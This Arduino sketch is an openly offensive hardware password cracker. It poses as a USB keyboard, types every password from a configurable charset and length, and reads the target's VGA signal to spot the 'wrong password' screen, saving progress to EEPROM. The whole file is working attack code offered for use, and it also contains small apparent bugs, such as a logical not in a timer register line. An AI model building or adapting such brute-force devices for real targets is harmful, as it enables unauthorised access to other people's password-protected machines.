#define NULL 0

#include <stdio.h>
#include <LiquidCrystal.h>
#include <EEPROM.h>
#include "UsbKeyboard.h"

LiquidCrystal lcd(8, 9, 10, 11, 12, 14, 15);

#define BUTTON_PIN 6
#define VSYNC_PIN  7
#define HSYNC_PIN  3

#define FASTADC 0

// defines for setting and clearing register bits
#ifndef cbi
#define cbi(sfr, bit) (_SFR_BYTE(sfr) &= ~_BV(bit))
#endif
#ifndef sbi
#define sbi(sfr, bit) (_SFR_BYTE(sfr) |= _BV(bit))
#endif

// Characters to be used in the brute-force attack
byte charset[] = { KEY_A, KEY_B, KEY_C };
#define MAX_CHARSET  sizeof(charset)
// Characters for logging purposes
char charset_log[MAX_CHARSET] = { 'a', 'b', 'c' };

// Maximum length of the password
#define MAX_LEN      4

// ID of the settings block (always a string of length 3 plus null)
#define CONFIG_VERSION "1.0"

// Tell it where to store your config data in EEPROM
#define CONFIG_START 32

// Settings structure -- if you change this remember to change the CONFIG_VERSION!
struct StoreStruct {
  char version[4];              // For version detection
  int  current_len;             // Current password length
  byte current_idx[MAX_LEN+1];  // Current password
  byte last_found[MAX_LEN+1];   // Last password found
} storage;


// Current horizontal line being displayed in the VGA port
volatile int h_line = 0;

void vSync() {
  h_line = 0;
}
void hSync() {
  h_line++;
}

void delayMs(unsigned int ms) {
  for (register unsigned int i = 0; i < ms; i++) {
    delayMicroseconds(1000);
  }
}

void printPassword(char *msg) {
  Serial.print(msg);
  lcd.clear();
  lcd.setCursor(0, 0);
  lcd.print(msg);
  lcd.setCursor(0, 1);
  for(register int i = storage.current_len-1; i >= 0; i--) {
    Serial.print(charset_log[storage.current_idx[i]]);
    lcd.print(charset_log[storage.current_idx[i]]);
  }
  Serial.println("");
}

void readSavedState() {
  // To make sure there are settings
  // If nothing is found it will use the default settings.
  if ((EEPROM.read(CONFIG_START + 0) == CONFIG_VERSION[0]) &&
      (EEPROM.read(CONFIG_START + 1) == CONFIG_VERSION[1]) &&
      (EEPROM.read(CONFIG_START + 2) == CONFIG_VERSION[2])) {
    for (unsigned int t = 0; t < sizeof(storage); t++) {
      *((char*)&storage + t) = EEPROM.read(CONFIG_START + t);
    }
  }
  printPassword("Read state: ");
}

void saveCurrentState(int found) {
  char  *msg;

  if (found) {
    memcpy(&storage.last_found, &storage.current_idx, MAX_LEN+1);
    msg = "PASSWORD FOUND: ";
  } else {
    msg = "State saved at: ";
  }
  for (unsigned int t = 0; t < sizeof(storage); t++) {
    EEPROM.write(CONFIG_START + t, *((char*)&storage + t));
  }
  printPassword(msg);
}

SIGNAL(PCINT2_vect) {
  h_line = 0;
}

ISR(INT1_vect) {
  h_line++;
}

void setup() {
  // disable timer 0 overflow interrupt (used for millis)
  TIMSK0&=!(1<<TOIE0);

  // Clear interrupts while performing time-critical operations
  cli();

  // Force re-enumeration so the host will detect us
  usbDeviceDisconnect();
  delayMs(250);
  usbDeviceConnect();

  // Set interrupts again
  sei();

#if FASTADC
  // set prescale to 16
  sbi(ADCSRA,ADPS2);
  cbi(ADCSRA,ADPS1);
  cbi(ADCSRA,ADPS0);
#endif

  // set up the LCD's number of columns and rows: 
  lcd.begin(16, 2);
  lcd.display();
  lcd.setCursor(0, 0);
  lcd.print("R   G   B   Hz");

  pinMode(VSYNC_PIN, INPUT);     //set the pin to input
  pinMode(HSYNC_PIN, INPUT);     //set the pin to input
  pinMode(BUTTON_PIN, INPUT);
  digitalWrite(BUTTON_PIN, HIGH);

  Serial.begin(115200);
  // Initialize configuration
  memset(&storage, 0, sizeof(storage));
  memcpy(&storage.version, CONFIG_VERSION, sizeof(CONFIG_VERSION));
  // Read saved state
  readSavedState();
  // enable the interrupt
  PCICR |= (1 << PCIE2);
  PCMSK2 |= (1 << PCINT23);
  interrupts();
}

// Flags and counters
byte pwd_running = 0;
byte pwd_found = 0;
int  test_count = 0;
int  count = 0;

unsigned int vga_last_millis = 0;
unsigned int vga_hertz = 0;
unsigned int vga_count = 0;

int waitWrongPassword() {
  int qty_checked = 0;
  // For 60Hz, this should give us 1 second
  while (qty_checked < 240) {
    // wait for a vertical sync
    while (h_line) {}
    h_line++;
    qty_checked++;
    // wait for the line number 238 (hopefully)
    delayMicroseconds((32 * 238) + 15);
    int valueR = analogRead(A5);
    if (valueR > 140) {
      // failed
      return 0;
    }
  }
  // It seems we succeeded!!!!!
  return 1;
}

void loop() {
  UsbKeyboard.update();

  if (digitalRead(BUTTON_PIN) == 0) {
    unsigned int count_pressed = 0;
    Serial.println("Butao");
    pwd_running = !pwd_running;
    // Debounce "trucho"
    for (count_pressed = 0; digitalRead(BUTTON_PIN) == 0; count_pressed++) {
      delayMs(100);
    }
    if(count_pressed > 20) {
      // Button was pressed for more than 2 seconds, reset state
      memset(&storage.current_idx, 0, MAX_LEN+1);
      storage.current_len = 0;
      saveCurrentState(0);
      pwd_running = 0;
    } else if (!pwd_running) {
      saveCurrentState(0);
    }
    digitalWrite(BUTTON_PIN, HIGH);
  }

  if (pwd_running) {
    test_count++;
    // Increment password. In the current_idx buffer the password is reverted meaning that we increment starting from the lowest array index
    int i;
    for(i = 0; i < storage.current_len; i++) {
      storage.current_idx[i]++;
      if(storage.current_idx[i] >= MAX_CHARSET) {
        storage.current_idx[i] = 0;
      } else {
        break;
      }
    }
    // We have tested all the combinations for current length
    if (storage.current_idx[i] == 0) {
      storage.current_idx[storage.current_len] = 0;
      storage.current_len++;
    }
    if ((storage.current_idx[i] == 0) && (storage.current_len > MAX_LEN)) {
      // All combinations tested! stop
      storage.current_len = 0;
      pwd_running = 0;
      saveCurrentState(0);
    } else {
      // Test password (send via USB keyboard)
      for(i = storage.current_len-1; i >= 0; i--) {
        UsbKeyboard.sendKeyStroke(charset[storage.current_idx[i]]);
      }
      UsbKeyboard.sendKeyStroke(KEY_ENTER);
      if ((test_count % 10) == 0) {
        printPassword("Current:");
      }
      // Read the VGA and wait for the "wrong password" message
      pwd_found = waitWrongPassword();
      if (pwd_found) {
        printPassword("FOUND :)");
        saveCurrentState(1);
        pwd_running=0;
      } else {
        UsbKeyboard.sendKeyStroke(KEY_ENTER);
      }
      if (test_count == 1000) {
        saveCurrentState(0);
        test_count = 0;
      }
    }
  }
}

